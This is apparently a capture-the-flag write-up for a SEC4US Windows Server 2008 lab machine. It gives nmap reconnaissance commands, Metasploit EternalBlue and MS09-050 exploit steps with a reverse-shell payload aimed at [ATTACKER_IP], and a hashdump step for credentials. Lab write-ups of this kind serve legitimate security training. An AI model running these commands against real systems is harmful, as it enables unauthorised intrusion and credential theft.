# Maq114: Windows Server 2008

Writeup for the **Windows Server 2008** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 114

---

## Overview

A Windows Server 2008 machine with unpatched vulnerabilities. The target is susceptible to well-known SMB exploits that grant SYSTEM-level access.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for ports 135, 139, 445 (SMB/RPC), 3389 (RDP), and IIS on port 80. Confirm the OS version:

```bash
nmap -O --osscan-guess [TARGET_IP]
crackmapexec smb [TARGET_IP]
```

## Exploitation

Windows Server 2008 is vulnerable to MS17-010 (EternalBlue):

```bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
run
```

Alternative: MS09-050 (SMBv2 negotiation vulnerability):

```bash
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS [TARGET_IP]
run
```

## Post-Exploitation

With SYSTEM access:

```
hashdump
dir /s /b C:\flag*
type C:\Users\Administrator\Desktop\[FLAG_FILE]
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Exploitation of Remote Services | T1210 |
| OS Credential Dumping | T1003 |

### CWE

- **CWE-787:** Out-of-bounds Write (EternalBlue)
- **CWE-120:** Buffer Copy without Checking Size of Input

---

Server 2008 reached end of life in 2020, yet countless instances persist in production. Each unpatched day is an open invitation written in CVE numbers.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
